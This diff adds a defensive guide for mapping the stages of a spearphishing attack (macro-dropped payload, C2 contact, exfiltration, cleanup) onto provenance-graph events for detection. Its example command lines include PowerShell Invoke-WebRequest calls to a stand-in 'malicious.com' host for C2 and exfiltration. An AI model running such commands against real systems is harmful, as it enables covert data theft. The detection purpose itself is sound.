@@ -1,0 +1,34 @@
+1. **Identify Initial Access via Spearphishing Email**  
+   - Map the event where the victim opens the malicious attachment.  
+   - Target the `srcNode` with `Image` set to `Outlook` and `Cmdline` indicating the action of opening the attachment (e.g., `Start-Process "C:\\Users\\Victim\\Downloads\\invoice.docx"`).  
+   - Set `relation` to `Process Create` to capture the process creation event.
+
+2. **Capture Exploit Execution**  
+   - Identify the event where the victim opens the malicious Word document.  
+   - Set `srcNode` with `Image` as `WINWORD.EXE` (Microsoft Word) and `Cmdline` reflecting the action of executing the macro.  
+   - The `dstNode` should reflect the temporary file created during the macro execution (e.g., `C:\\Users\\Victim\\AppData\\Local\\Temp\\payload.exe`).  
+   - Use `relation` as `Process Create`.
+
+3. **Detect Payload Execution**  
+   - Monitor for the execution of the payload.  
+   - Set `srcNode` with `Image` as `powershell.exe` and `Cmdline` indicating the execution of the payload (e.g., `Start-Process "C:\\Users\\Victim\\AppData\\Local\\Temp\\payload.exe"`).  
+   - The `dstNode` should be the same executable file (`payload.exe`).  
+   - Use `relation` as `Process Create`.
+
+4. **Monitor Command and Control Communication**  
+   - Identify network communication initiated by the payload.  
+   - Set `srcNode` with `Image` as `powershell.exe` and `Cmdline` indicating the command to send data to the C2 server (e.g., `Invoke-WebRequest -Uri "http://malicious.com/c2"`).  
+   - Set `dstNode` with `Dstaddress` as `malicious.com` and `Port` as `80` or `443` depending on the protocol used.  
+   - Use `relation` as `TCP Connect`.
+
+5. **Track Data Exfiltration**  
+   - Capture events related to the exfiltration of sensitive data.  
+   - Set `srcNode` with `Image` as `powershell.exe` and `Cmdline` indicating the command to exfiltrate data (e.g., `Invoke-WebRequest -Uri "http://malicious.com/exfil"`).  
+   - The `dstNode` should reflect the C2 server address (`malicious.com`).  
+   - Use `relation` as `TCP Connect`.
+
+6. **Detect Cleanup and Persistence Actions**  
+   - Monitor for actions taken to delete the payload or create persistence mechanisms.  
+   - Set `srcNode` with `Image` as `powershell.exe` and `Cmdline` indicating the deletion command (e.g., `Remove-Item "C:\\Users\\Victim\\AppData\\Local\\Temp\\payload.exe"`).  
+   - The `dstNode` should reflect the file being deleted.  
+   - Use `relation` as `File: CloseFile` or `File: DeleteFile` depending on the action taken.
